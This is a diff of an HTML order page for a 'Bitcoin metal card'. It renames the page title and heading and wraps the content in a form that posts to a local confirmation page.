@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Metal Card Bitcoin Payment</title>
+<title>Order Your Bitcoin Card</title>
 <style>
 /* ---- Modern, Clean Apple-style CSS (REPLACE your current <style> block with this) ---- */
 
@@ -227,7 +227,9 @@ select:focus { box-shadow: var(--focus-shadow); border-color: var(--accent); }
 
 <div class="container">
 
-    <div class="title">Metal Card Bitcoin Payment</div>
+    <div class="title">Order Your Bitcoin Metal Card(s)</div>
+ <form action="confirmation_page.html" method="POST">
+
 
     <!-- Top promotional image -->
     <img class="promo-img" 
@@ -284,7 +286,7 @@ select:focus { box-shadow: var(--focus-shadow); border-color: var(--accent); }
 <img class="promo-img" 
      src="https://raw.githubusercontent.com/qfsnesaragesara/BTC-METAL-CARD-PAYMENT/main/photo 1.jpg">
 
-
+</form>
 </div>
 
 <div class="modal-bg" id="modalBg">
